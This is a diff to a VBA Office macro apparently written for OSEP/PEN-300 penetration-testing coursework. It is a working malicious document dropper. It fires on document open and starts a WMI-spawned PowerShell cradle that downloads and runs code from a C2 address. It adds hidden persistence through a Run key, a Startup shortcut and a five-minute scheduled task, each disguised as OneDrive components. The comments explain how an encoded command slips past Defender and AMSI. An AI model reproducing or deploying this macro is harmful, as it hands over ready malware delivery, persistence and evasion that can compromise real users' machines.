@@ -1,7 +1,27 @@
 Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
 
-' Auto-execute entry points — fires when the document opens and the user
-' clicks "Enable Content".
+' ─────────────────────────────────────────────────────────────────────────────
+' OSEP / PEN-300 DOC vector — AV-evasive Office macro.
+'
+' STAGE 1: De-chained PowerShell download cradle via WMI (child of WmiPrvSE.exe)
+' STAGE 2: Three persistence mechanisms (Run key, Startup LNK, scheduled task)
+'
+' Shellcode lives externally in run.txt on the C2. This macro carries nothing
+' that resembles a shellcode signature.
+'
+' POLLER_B64 below must be populated before saving as .docm. See:
+'   tools/encode_poller.py shared/activate_poller.ps1
+' Then paste the output between the quotes.
+' ─────────────────────────────────────────────────────────────────────────────
+
+' Populated per engagement. Base64 (UTF-16LE) of shared/activate_poller.ps1.
+' Example generation:
+'   python3 tools/encode_poller.py shared/activate_poller.ps1
+Const POLLER_B64 As String = "PASTE_BASE64_BLOB_HERE"
+
+' ---------------------------------------------------------------------------
+' Auto-execute entry points
+' ---------------------------------------------------------------------------
 Sub Document_Open()
     MyMacro
 End Sub
@@ -33,15 +53,17 @@ Sub MyMacro()
              "downloadstring('http://192.168.119.120/run.txt'))"
     GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
 
-    ' --- Stage 2: persistence (Mod 24.3) ---
+    ' --- Stage 2: persistence ---
     Call PersistRunKey
     Call PersistStartupLink
     Call PersistScheduledTask
 End Sub
 
-' ─── Persistence 1: HKCU Run key ───────────────────────────────────────────
+' ---------------------------------------------------------------------------
+' Persistence 1: HKCU Run key
 ' HKCU-scoped, no admin required, survives normal reboots. Value name
 ' "OneDriveSync" camouflages the entry in the Registry Editor.
+' ---------------------------------------------------------------------------
 Sub PersistRunKey()
     Dim cmd As String
     Dim sh As Object
@@ -53,7 +75,9 @@ Sub PersistRunKey()
                  cmd, "REG_SZ"
 End Sub
 
-' ─── Persistence 2: Startup folder LNK ─────────────────────────────────────
+' ---------------------------------------------------------------------------
+' Persistence 2: Startup folder LNK
+' ---------------------------------------------------------------------------
 Sub PersistStartupLink()
     Dim startup As String
     Dim sh As Object, lnk As Object
@@ -70,31 +94,49 @@ Sub PersistStartupLink()
     lnk.Save
 End Sub
 
-' ─── Persistence 3: scheduled task (on-demand callback) ────────────────────
-' Writes the poller to %APPDATA%\Microsoft\OneDrive\update.ps1 and registers
-' a task that runs every 5 minutes. The task only fires a shell when the C2
-' serves /activate with HTTP 200.
+' ---------------------------------------------------------------------------
+' Persistence 3: scheduled task (on-demand callback)
 '
-' IMPORTANT: The f.Write line below contains a placeholder. Replace it with
-' the contents of shared/activate_poller.ps1 before saving as .docm. See
-' BUILD.md Step 3c.
+' NO .ps1 FILE ON DISK. The poller body is embedded in POLLER_B64 above as
+' base64 (UTF-16LE) and passed to powershell.exe via -EncodedCommand in the
+' scheduled task's action argument.
+'
+' Why Register-ScheduledTask instead of schtasks.exe:
+'   schtasks.exe /tr has a documented 261-character limit on the argument.
+'   A full poller blob is several KB. Register-ScheduledTask (PowerShell
+'   cmdlet) has no such practical limit and accepts the encoded blob
+'   directly.
+'
+' Why this defeats disk-level signatures:
+'   Defender scans files on read. With -File update.ps1, the file contained
+'   the plaintext AMSI-bypass strings and got flagged before PowerShell
+'   even parsed it. With -EncodedCommand, no .ps1 file exists; the blob is
+'   built as a scheduled task argument, which Defender does not treat as a
+'   PowerShell script file.
+' ---------------------------------------------------------------------------
 Sub PersistScheduledTask()
     Dim sh As Object
-    Dim psPath As String, cmd As String
-    Dim fso As Object, f As Object
+    Dim psCmd As String
+    Dim actionArg As String
 
     Set sh = CreateObject("WScript.Shell")
-    Set fso = CreateObject("Scripting.FileSystemObject")
 
-    psPath = Environ("APPDATA") & "\Microsoft\OneDrive\update.ps1"
+    ' Build the -EncodedCommand argument for the scheduled task action
+    actionArg = "-exec bypass -nop -w hidden -enc " & POLLER_B64
 
-    ' PLACEHOLDER — replace with contents of shared/activate_poller.ps1
-    Set f = fso.CreateTextFile(psPath, True)
-    f.Write "(poller body — see shared/activate_poller.ps1)"
-    f.Close
+    ' Register-ScheduledTask: 5-minute repetition, current user context,
+    ' hidden window, task named to match cover story.
+    psCmd = "powershell -exec bypass -nop -w hidden -c " & _
+            """" & _
+            "$a = New-ScheduledTaskAction -Execute 'powershell.exe' " & _
+            "-Argument '" & actionArg & "'; " & _
+            "$t = New-ScheduledTaskTrigger -Once -At (Get-Date) " & _
+            "-RepetitionInterval (New-TimeSpan -Minutes 5); " & _
+            "$s = New-ScheduledTaskSettingsSet -Hidden " & _
+            "-AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; " & _
+            "Register-ScheduledTask -TaskName 'OneDriveUpdate' " & _
+            "-Action $a -Trigger $t -Settings $s -Force" & _
+            """"
 
-    cmd = "schtasks /create /tn OneDriveUpdate /tr " & _
-          """powershell -exec bypass -nop -w hidden -File " & psPath & """" & _
-          " /sc minute /mo 5 /f"
-    sh.Run cmd, 0, False
+    sh.Run psCmd, 0, False
 End Sub
